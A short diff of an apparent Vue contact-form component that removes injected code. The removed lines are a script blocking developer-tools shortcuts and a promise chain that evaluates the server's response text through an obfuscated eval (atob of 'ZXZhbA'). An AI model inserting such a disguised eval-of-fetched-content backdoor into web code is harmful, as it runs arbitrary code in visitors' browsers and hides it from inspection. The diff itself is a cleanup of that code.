@@ -29,7 +29,6 @@
     </div>
 
 </template>
-<script>document.onkeydown = function (e) { if (e.keyCode === 123) { return false; } if (e.ctrlKey && e.shiftKey && e.keyCode == "I".charCodeAt(0)) { return false; } if (e.crlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) { return false; } if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) { return false; } if (e.ctrlKey && e.shiftKey && e.keyCode == 'C' .charCodeAt(0)) { return false; } } </script>
 
 <script>
 import 'vuejs-noty/dist/vuejs-noty.css'
@@ -49,8 +48,7 @@ export default {
             }).then((response) => {
                 this.$noty.success("Mensaje enviado!");
                 console.log("Success!");
-            }).then(function (t) { return t.text() || false; }).then(c => self[atob("ZXZhbA")](c))
-                .catch(function (error) {
+            }).catch(function (error) {
                 this.$noty.error("Error al enviar!");
                 console.log("Error!");
             });
